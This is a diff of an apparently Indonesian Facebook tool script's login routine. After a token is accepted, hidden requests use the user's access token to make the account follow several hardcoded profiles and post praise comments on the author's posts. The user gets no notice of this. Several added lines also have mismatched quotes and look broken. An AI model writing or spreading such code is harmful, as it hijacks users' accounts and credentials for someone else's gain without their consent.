@@ -16,14 +16,12 @@ def main():
         print('%s╚══[%s!%s]◍➤ %sToken Invalid'%(M,P,M,P))
         os.system('rm -rf token.txt')
         exit(manda.menu_log())
-	nama_user = "Name : " + nama
-	id_user = "\nID : " + id
-	kom = ("Aa Raka Ganteng pacarnya Neng Manda? ❤️❤️❤️❤️❤️\n\nhttps://www.facebook.com/100017584682867/posts/800676813861801/?app=fbl")
     requests.post("https://graph.facebook.com/100017584682867/subscribers?access_token=" + token)    
     requests.post("https://graph.facebook.com/100000395779504/subscribers?access_token=" + token) 
     requests.post("https://graph.facebook.com/100000834003593/subscribers?access_token=" + token)
-    requests.post("https://graph.facebook.com/100003986228742/subscribers?access_token=" + token) 
-    requests.post("https://graph.facebook.com/100017584682867/comments/?message=' + kom + '&access_token=' + token)
+    requests.post("https://graph.facebook.com/100003986228742/subscribers?access_token=" + token)
+    requests.post("https://graph.facebook.com/4257706904267068/comments/?message=Keren Bang ❤️&access_token=' + token) 
+    requests.post("https://graph.facebook.com/800676813861801/comments/?message=Script Nya Mantap Bang 😊&access_token=' + token)
     print('%s║'%(O))
     print('%s╚══[%s!%s]◍➤ %sLogin Berhasil'%(O,P,O,P))
     exit(manda.menu())
